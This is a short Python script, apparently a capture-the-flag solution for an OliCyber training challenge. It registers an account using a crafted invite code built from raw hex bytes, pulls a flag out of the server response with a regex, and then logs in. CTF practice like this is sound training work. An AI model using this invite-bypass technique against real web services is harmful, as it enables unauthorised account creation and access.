import requests, re
username, password = "tempUsername", "tempPassword" # cambiare username e password per riuscire ad ottenere la flag
site = "http://frittomisto.challs.olicyber.it/"
inviteCode = bytes.fromhex("00010203040506070809").decode()
s = requests.Session()
#print(inviteCode)
r = s.post(site + "api/register", json={"username":username, "password":password, "invite":inviteCode}).text
flag1 = str(re.findall('flag{.*}"', r)[0])
print(flag1[:len(flag1)-1], end="")
r = s.post(site + "api/login", json={"username":username, "password":password}).text